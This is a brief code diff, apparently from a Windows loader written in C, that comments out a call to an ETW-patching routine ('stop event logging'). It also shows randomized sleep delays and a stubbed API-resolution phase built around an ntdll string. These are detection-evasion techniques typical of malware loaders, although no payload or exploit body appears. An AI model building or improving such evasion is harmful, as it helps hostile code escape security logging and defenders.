@@ -223,7 +223,7 @@ int main()
     Sleep(3000 + (GetTickCount() % 2000));
 
     // Patch ETW (stop event logging)
-    PatchETW();
+    // PatchETW(); // Turn off for now to reduce loader to non-invasive evasion
 
     // ---- Phase 2: Resolve APIs ----
     // const char *ntdll = BuildString_ntdll();
